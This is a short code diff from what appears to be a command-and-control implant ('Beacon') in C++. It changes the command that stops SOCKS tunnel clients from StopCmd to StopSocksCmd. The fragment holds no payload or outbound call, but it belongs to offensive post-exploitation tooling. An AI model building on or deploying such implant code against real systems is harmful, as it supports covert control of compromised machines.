@@ -613,7 +613,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		{
 			return false;
 		}
-		else if(c2Message.cmd() == StopCmd)
+		else if(c2Message.cmd() == StopSocksCmd)
 		{
 			for(int i=0; i<m_socksTunnelClient.size(); i++)
 				m_socksTunnelClient[i].reset(nullptr);
